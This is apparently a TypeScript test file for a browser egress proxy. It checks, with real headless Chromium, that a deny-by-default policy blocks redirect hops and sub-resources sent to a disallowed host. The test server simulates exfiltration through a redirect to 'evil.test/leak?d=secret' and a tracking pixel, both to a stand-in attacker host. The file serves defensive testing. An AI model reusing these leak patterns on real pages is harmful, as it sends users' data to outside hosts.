/**
 * The browser egress proxy with a real headless Chromium: every request a
 * page makes — redirect hops included — is judged before it is sent.
 * Skipped where no Chromium is installed for Playwright.
 */
import { existsSync } from 'node:fs';
import { createServer, type Server } from 'node:http';
import { afterAll, beforeAll, describe, expect, test, vi } from 'vitest';
import { egressPolicySchema } from '@/shared/egress-policy';

const state = vi.hoisted(() => ({ policy: undefined as unknown }));
vi.mock('@/config', async (orig) => {
  const real = await orig<typeof import('@/config')>();
  return {
    ...real,
    getConfig: () => {
      let base: Record<string, any> = {};
      try { base = real.getConfig() as unknown as Record<string, any>; } catch { /* not loaded in this lane */ }
      return { ...base, security: { ...(base.security ?? {}), egressPolicy: state.policy } };
    },
  };
});
vi.mock('@/db/repositories/audit-repository', () => ({ auditRepository: { log: async () => {} } }));

const { chromium } = await import('playwright');
const { browserEgressFor } = await import('./browser-egress');
const executable = (() => { try { return chromium.executablePath(); } catch { return ''; } })();
const haveChromium = !!executable && existsSync(executable);

describe.skipIf(!haveChromium)('browser egress proxy (real Chromium)', () => {
  let server: Server;
  let port = 0;
  const hits: string[] = [];
  beforeAll(async () => {
    server = createServer((req, res) => {
      hits.push(`${req.headers.host?.split(':')[0]}${req.url}`);
      if (req.url === '/start') { res.writeHead(302, { location: `http://evil.test:${port}/leak?d=secret` }).end(); return; }
      if (req.url === '/leak?d=secret') { res.writeHead(302, { location: `http://good.test:${port}/final` }).end(); return; }
      res.end(`<html><body>page<img src="http://evil.test:${port}/pixel.gif"></body></html>`);
    });
    await new Promise<void>((r) => server.listen(0, '127.0.0.1', () => r()));
    port = (server.address() as { port: number }).port;
  });
  afterAll(() => new Promise<void>((r) => server.close(() => r())));

  const resolveTest = async (host: string) => (host.endsWith('.test') ? ['127.0.0.1'] : ['93.184.216.34']);

  test('a denied middle redirect hop and a denied sub-resource are never contacted; loopback does not bypass the proxy', async () => {
    state.policy = egressPolicySchema.parse({ default: 'deny', rules: [{ action: 'allow', host: 'good.test' }] });
    const egress = await browserEgressFor({ tool: 'browser', role: 'research' }, { resolve: resolveTest, allowPrivateAddresses: true });
    expect(egress).not.toBeNull();
    const browser = await chromium.launch({ headless: true });
    try {
      const context = await browser.newContext({ proxy: egress!.proxy });
      const page = await context.newPage();
      hits.length = 0;
      const response = await page.goto(`http://good.test:${port}/start`).catch((e: Error) => e);
      // The redirect to evil.test is refused at the proxy: the navigation ends on the 403.
      if (!(response instanceof Error)) expect(response?.status()).toBe(403);
      expect(hits).toEqual(['good.test/start']);

      hits.length = 0;
      await page.goto(`http://good.test:${port}/final`);
      await page.waitForLoadState('load');
      expect(hits).toEqual(['good.test/final']);

      hits.length = 0;
      const direct = await page.goto(`http://127.0.0.1:${port}/final`).catch((e: Error) => e);
      if (!(direct instanceof Error)) expect(direct?.status()).toBe(403);
      expect(hits).toEqual([]);
    } finally {
      await browser.close();
      egress?.close();
    }
  }, 60_000);

  test('no policy: no proxy, the context opens as before', async () => {
    state.policy = egressPolicySchema.parse({});
    expect(await browserEgressFor({ tool: 'browser' })).toBeNull();
  });
});
